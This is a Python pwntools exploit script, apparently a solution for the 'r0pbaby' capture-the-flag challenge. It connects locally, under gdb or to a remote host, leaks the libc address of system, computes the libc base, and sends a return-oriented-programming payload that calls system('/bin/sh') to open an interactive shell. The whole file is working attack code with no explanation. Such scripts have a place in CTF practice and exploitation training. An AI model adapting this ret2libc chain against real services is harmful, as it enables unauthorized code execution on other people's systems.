#!/usr/bin/env python3
# -*- coding:utf-8 -*

from pwn import *
from sys import argv
from time import sleep

context.terminal = ['terminator','-e']
context.log_level = "debug"

chall = "./r0pbaby"
libc = ELF("/usr/lib/libc.so.6")
elf = ELF(chall)
context.binary = chall
context.binary.checksec()

if len(argv) >= 2 and argv[1] == "r":
    p = remote("example.com", 4444)
elif len(argv) >= 2 and argv[1] == "d":
	cmd = """
		b __libc_start_main
		c
	"""
	p = gdb.debug(chall,cmd)
else:
    p = process(chall)


pop_rdi_offset = 0x27f75
bin_sh_offset = 0x18bb62

# Get libc base address
#p.recvuntil(": ")
#p.sendline("1")
#p.recvuntil("libc.so.6: ")
#libc_base = eval(p.recv(18))
#log.info("libc_base: 0x{:08x}".format(libc_base))
#pop_rdi_addr = libc_base + pop_rdi_offset
#log.info("pop rdi; ret: 0x{:08x}".format(pop_rdi_addr))
#bin_sh_addr = libc_base + bin_sh_offset
#log.info("/bin/sh address: 0x{:08x}".format(bin_sh_offset))

# Get system@libc address
p.recvuntil(": ")
p.sendline("2")
p.recvuntil("Enter symbol: ")
p.sendline("system")
p.recvuntil("Symbol system: ")
system_libc_addr = eval(p.recv(18))
log.info("system@libc: 0x{:08x}".format(system_libc_addr))

libc_base = system_libc_addr - libc.symbols['system']
log.info("libc_base: 0x{:08x}".format(libc_base))
pop_rdi_addr = libc_base + pop_rdi_offset
log.info("pop rdi; ret: 0x{:08x}".format(pop_rdi_addr))
bin_sh_addr = libc_base + bin_sh_offset
log.info("/bin/sh address: 0x{:08x}".format(bin_sh_addr))

payload = b"A" * 0x8# buffer for saved rbp
payload += p64(pop_rdi_addr)
payload += p64(bin_sh_addr)
payload += p64(system_libc_addr)

p.recvuntil(": ")
p.sendline("3")
p.recvuntil("Enter bytes to send (max 1024):")
p.sendline("%d" % (len(payload)))
p.sendline(payload)

p.interactive()
